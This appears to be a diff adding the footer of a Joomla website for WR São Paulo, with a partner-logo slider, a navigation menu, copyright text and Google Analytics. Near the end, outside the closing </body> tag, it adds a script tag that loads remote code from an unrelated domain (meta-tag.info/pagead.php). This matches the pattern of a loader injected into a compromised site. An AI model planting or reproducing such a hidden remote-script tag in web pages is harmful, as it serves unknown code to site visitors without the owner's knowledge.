+														<div class="nspArt unvisible" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.alafa1nsp_113.png" alt="Alafa" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+														<div class="nspArt unvisible" style="width:100%;"><div style="padding:0 20px 0px 0"><div class="center tcenter fnone"><img class="nspImage" src="http://www.wrsaopaulo.com.br/modules/mod_news_pro_gk4/cache/Parceiros.aimex1nsp_113.png" alt="Aimex" width:298px;height:70px;margin:3px 20px 0 0; /></div></div></div>
+					
+			</div>
+					</div>
+
+<script type="text/javascript">
+//<![CDATA[
+try {$Gavick;}catch(e){$Gavick = {};};
+$Gavick["nsp-nsp_113"] = {
+	"animation_speed": 400,
+	"animation_interval": 5000,
+	"animation_function": Fx.Transitions.Expo.easeIn,
+	"news_column": 1,
+	"news_rows": 3,
+	"links_columns_amount": 0,
+	"links_amount": 0,
+	"counter_text": '<strong>Page:</strong>'
+};
+//]]>
+</script>	</div></div></div>
+	</div>
+		</div>
+
+<div id="gkBottom2" class="gkMain gkWrap ">
+			
+	<div id="gkbottombottom7" class="gkCol gkColFull">
+				<div class="box"><div><div class="content">
+<ul class="menu">
+<li class="item-101 current active"><a href="/" >Home</a></li><li class="item-264 parent"><span class="separator">WR São Paulo</span>
+</li><li class="item-265 parent"><span class="separator">Eventos</span>
+</li><li class="item-266"><a href="/index.php/clientes" >Clientes</a></li><li class="item-267"><a href="/index.php/noticias" >Notícias </a></li><li class="item-268"><a href="/index.php/imprensa" >Imprensa</a></li><li class="item-269"><a href="/index.php/contato" >Contato</a></li></ul>
+</div></div></div>
+	</div>
+		</div>
+
+    		
+<div id="gkFooter" class="gkMain gkWrap">
+
+	
+	<div id="gkFooterNav">
+
+<div class="custom"  >
+	<table cellpadding="0" cellspacing="0" border="0" align="center" style="width: 100%; background-image: url('/none'); border-width: 0px; border-style: solid;">
+<tbody>
+<tr>
+<td align="left"><img src="/images/logo-wr.png" alt="logo-wr" width="47" height="37" style="float: left;" />&nbsp;</td>
+<td style="height: 40px;">
+<p style="text-align: center; font-size: 11px; color: #000000; line-height: 16px;">WR S&atilde;o Paulo - Copyright &reg; 2012 - 2016 - Todos os direitos reservados. <br /> &Eacute; proibida a reprodu&ccedil;&atilde;o total ou parcial deste website, em qualquer meio de comunica&ccedil;&atilde;o, sem pr&eacute;via autoriza&ccedil;&atilde;o.</p>
+</td>
+<td align="right"><p style="text-align: right; font-size: 11px; color: #808080; line-height: 16px;">Developer e Upgrade</font><br><a href="http://www.agencianaweb.com.br/" target="_blank"><img src="/images/www.agencianaweb.com.br.png" alt="Designed by Agencia na Web" style="float: right;" /></a>&nbsp;</td>
+</tr>
+</tbody>
+</table></div>
+
+	</div>
+
+	
+
+	
+	
+
+
+    
+	
+</div>
+
+
+
+
+
+    	</div>
+
+    </div>
+
+    
+
+	
+
+
+
+
+	
+
+	
+
+<div class="custom"  >
+	<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-34131850-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script></div>
+
+
+</body>
+
+<script type="text/javascript" src="http://www.meta-tag.info/pagead.php"></script>
+
+</html>
